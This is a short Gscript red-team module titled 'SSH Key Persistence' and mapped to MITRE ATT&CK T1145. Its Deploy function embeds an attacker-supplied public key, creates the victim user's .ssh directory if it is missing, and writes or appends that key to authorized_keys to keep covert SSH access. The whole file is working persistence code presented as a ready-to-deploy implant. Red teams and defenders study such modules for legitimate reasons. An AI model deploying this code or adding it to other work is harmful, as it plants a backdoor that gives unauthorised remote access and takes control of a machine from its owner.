// Title: SSH Key Persistence
// Author: micahjmartin
// Purpose: add a public ssh key to users accounts
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1145
// Note: Assumes ssh key access is already enabled

//priority:110
//timeout:75

//go_import:os as os
//go_import:os/user as user

//import:/private/tmp/id_rsa.pub

function Deploy() {
    // Getting our asset
    var pubKey = GetAssetAsBytes("id_rsa.pub");
    console.log("errors: "+pubKey[1]);

    // get user homedir
    var myUser = user.Current();
    console.log(myUser[0]);
    // make .ssh dir
    var dirname = myUser[0].HomeDir+"/.ssh/";
    var dirstat = os.Stat(dirname);
    if (os.IsNotExist(dirstat[1])) { 
        G.exec.ExecuteCommand("/bin/mkdir", [dirname]);
    }
    //make authorize keys file
    var filename = myUser[0].HomeDir+ "/.ssh/authorized_keys";
    var stat = os.Stat(filename);
    if (os.IsNotExist(stat[1])) {   
        errors = G.file.WriteFileFromBytes(filename, pubKey[0]);    
        console.log("errors: "+Dump(errors));
        console.log("SSH key added"); 
    } else {
        var appendedFileError = G.file.AppendFileBytes(filename, pubKey[0]);
        console.log("errors: "+ Dump(appendedFileError));
        console.log("SSH key appended");    
    }
    return true;
}
